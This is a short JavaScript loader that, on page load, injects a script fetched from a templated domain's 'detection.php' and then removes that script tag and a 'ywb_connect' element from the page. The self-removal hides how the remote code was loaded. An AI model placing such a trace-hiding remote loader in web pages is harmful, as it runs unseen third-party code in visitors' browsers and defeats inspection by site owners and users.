document.addEventListener('DOMContentLoaded', function () {
    let d = '{DOMAIN}';
    let scr = 'detection';
    let s = document.createElement('script');
    s.type = 'text/javascript';
    s.src = `${d}js/${scr}.php`;
    s.id = 'ywb_' + scr;
    document.querySelector('body').appendChild(s);
    document.getElementById(s.id).remove();
    let connScript = document.getElementById('ywb_connect');
    if (connScript) connScript.remove();
});